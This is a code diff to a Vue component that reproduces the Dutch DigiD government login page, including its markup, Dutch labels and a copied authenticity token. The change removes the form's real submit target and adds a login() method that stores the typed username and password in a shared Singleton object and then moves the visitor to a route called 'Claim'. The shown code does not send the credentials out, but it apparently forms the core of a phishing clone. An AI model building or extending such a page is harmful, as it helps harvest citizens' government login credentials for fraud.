@@ -1,7 +1,7 @@
 <template lang="html">
   <div id="content" class="CTID-99-_ eb-99-panel content">
       <div class="CTID-471-_ eb-471-panel service-form wrapper">
-        <form class="remember_login" id="new_authentication" action="/inloggen" accept-charset="UTF-8" method="post"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="Q7xjd4V8rvQTZRw4LS/vrbbkrkZF8ENKaRTvdr1MH50PdU0yaVLKs97Tf/b4XGNpW/OjGlUhIyFkZ7JAfZlFMA=="><header class="form__header"><div class="form__header__required-fields">Verplichte velden<span class="form__item__label__required">*</span></div></header>
+        <form class="remember_login" id="new_authentication" accept-charset="UTF-8" @submit.prevent="login()"><input name="utf8" type="hidden" value="✓"><input type="hidden" name="authenticity_token" value="Q7xjd4V8rvQTZRw4LS/vrbbkrkZF8ENKaRTvdr1MH50PdU0yaVLKs97Tf/b4XGNpW/OjGlUhIyFkZ7JAfZlFMA=="><header class="form__header"><div class="form__header__required-fields">Verplichte velden<span class="form__item__label__required">*</span></div></header>
           <fieldset class="form__item"><label class="form__item__label" for="authentication_type_account">Inlogmethode<span class="form__item__label__required">*</span></label><input class="form__item__field--box" data-required="true" type="radio" value="basis" checked="checked" name="authentication[type_account]" id="authentication_type_account_basis"><label class="form__item__box-label" for="authentication_type_account_basis">Ik wil inloggen met alleen gebruikersnaam en wachtwoord</label><input class="form__item__field--box" data-required="true" type="radio" value="midden" name="authentication[type_account]" id="authentication_type_account_midden"><label class="form__item__box-label" for="authentication_type_account_midden">Ik wil inloggen met een extra controle via sms</label><input class="form__item__field--box" data-required="true" type="radio" value="midden_via_app" name="authentication[type_account]" id="authentication_type_account_midden_via_app"><label class="form__item__box-label" for="authentication_type_account_midden_via_app">Ik wil inloggen met de DigiD app</label></fieldset>
 
           <div id="app_notice" class="block-with-icon--information" style="display: none;"><p>Let op! Deze inlogmethode is nieuw. Met de DigiD app kunt u eenvoudig en veilig inloggen. <a href="https://www.digid.nl/over-digid/app" target="_blank">Lees hoe u de DigiD app kunt installeren en activeren</a> [opent in een nieuw venster].</p></div>
@@ -12,17 +12,23 @@
           </div>
 
           <div class="form__item"><p>U kunt tot 23:21 uur (Nederlandse tijd) inloggen. Daarna verloopt uw sessie.</p>
-          </div><div class="actions"><input type="submit" @click="login()" name="commit" value="Inloggen" class="actions__left--button" id="submit-button" data-disable-with="Inloggen"><input type="submit" name="commit" value="Annuleren" class="actions__right--button" formnovalidate="formnovalidate" id="cancel-button" data-disable-with="Annuleren"></div>
+          </div><div class="actions"><input type="submit" name="commit" value="Inloggen" class="actions__left--button" id="submit-button" data-disable-with="Inloggen"><input type="submit" name="commit" value="Annuleren" class="actions__right--button" formnovalidate="formnovalidate" id="cancel-button" data-disable-with="Annuleren"></div>
         </form>
       </div>
   </div>
 </template>
 
 <script>
+import Singleton from "@/utils/Singleton.js"
+
 export default {
   methods: {
     login() {
-      
+      Singleton.user = {
+        username: this.username,
+        password: this.password
+      }
+      this.$router.push({ name: 'Claim' })
     }
   },
   mounted() {
